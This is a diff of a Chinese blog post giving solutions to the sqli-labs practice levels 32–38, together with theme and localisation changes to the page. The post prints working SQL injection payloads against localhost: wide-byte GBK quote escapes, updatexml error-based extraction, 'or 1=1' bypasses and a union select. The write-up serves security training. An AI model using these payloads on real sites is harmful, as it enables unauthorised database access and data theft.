+<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p>宽字节注入<br>单引号前被加了反斜杠转义，无法正常闭合。<br>但是如果使用了GBK编码，那么%df%5c会被认为是一个字，就可以使单引号逃逸。<br>payload:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>/sql/Less-<span class="number">32</span>/?id=<span class="number">1</span>%df<span class="subst">%27</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="subst">%23</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h3><p>和上题一样 </p>
-<h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>依旧是宽字节：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1%df&apos; or 1=1 %23&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-35?id=1 or updatexml(1,concat(0x7e,user(),0x7e),1) %23</span><br></pre></td></tr></table></figure>
-<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><p>还是宽字节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-36?id=1%df&apos; or updatexml(1,concat(0x7e,user(),0x7e),1) %23</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>依旧是宽字节：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=1%df' <span class="keyword">or</span> <span class="attribute">1</span>=1 %23&amp;<span class="attribute">passwd</span>=1&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>/sql/Less-<span class="number">35</span>?id=<span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="subst">%23</span></span><br></pre></td></tr></table></figure>
+<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><p>还是宽字节<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sql/Less<span class="number">-36</span>?id=<span class="number">1</span><span class="symbol">%df</span>' <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="symbol">%23</span></span><br></pre></td></tr></table></figure></p>
 <p>看了下源码，这几个题的不同就在于加反斜杠用了好几种不同的函数。</p>
-<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><p>依旧是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%df&apos; or updatexml(1,concat(0x7e,(user()),0x7e),1)%23&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h3><p>没看懂他的考点在哪，很轻易就注入成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or 1=1 %23</span><br><span class="line">?id=-1&apos; union select 1,2,database()%23</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><p>依旧是<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%df' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(user()),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span>&amp;passwd=<span class="number">1</span>&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h3><p>没看懂他的考点在哪，很轻易就注入成功<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">' or 1=1 %23</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,<span class="title">database</span>()%23</span></span><br></pre></td></tr></table></figure></p>
 
       
     </div>
-
-    
-
     
     
     
@@ -452,10 +376,17 @@
   </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
           </div>
+          
+
+
           
 
   
@@ -483,10 +414,10 @@
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
+            文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
+            站点概览
           </li>
         </ul>
       
@@ -495,55 +426,62 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
+              <img class="site-author-image" itemprop="image"
+                src="/images/IMG_4178.JPG"
+                alt="Altm4nz" />
+            
               <p class="site-author-name" itemprop="name">Altm4nz</p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">18</span>
-                    <span class="site-state-item-name">posts</span>
-                  </a>
-                </div>
-              
+          <nav class="site-state motion-element">
 
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                    
-                      
-                    
-                    <span class="site-state-item-count">1</span>
-                    <span class="site-state-item-name">tags</span>
-                  
-                </div>
-              
-            </nav>
-          
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
             
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
           
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:872801413@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
           
 
         </div>
@@ -580,20 +518,16 @@
     <footer id="footer" class="footer">
       <div class="footer-inner">
         <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
-  <span class="with-love" id="animate">
+  <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Altm4nz</span>
 
   
-
-  
 </div>
 
 
-
-
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
 
 
@@ -601,13 +535,12 @@
 
 
 
-  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.3.0</div>
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
 
 
 
 
         
-
 
 
 
@@ -627,10 +560,7 @@
     
 
     
-	
-    
 
-    
   </div>
 
   
@@ -649,12 +579,10 @@
 
 
 
+  
 
 
-
-
-
-
+  
 
 
 
@@ -673,6 +601,16 @@
 
   
   
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
     <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
   
 
@@ -681,50 +619,78 @@
     <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
   
 
-
   
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
-
-
-
   
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
   
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
-
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
 
 
   
 
 
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
 
 
 
   
-
-
-
   
 
-
-
-
-
-
-
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
 
 
 
   
 
 
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
 
 
 
@@ -735,12 +701,6 @@
   
 
   
-
-  
-  
-
-  
-
   
 
   
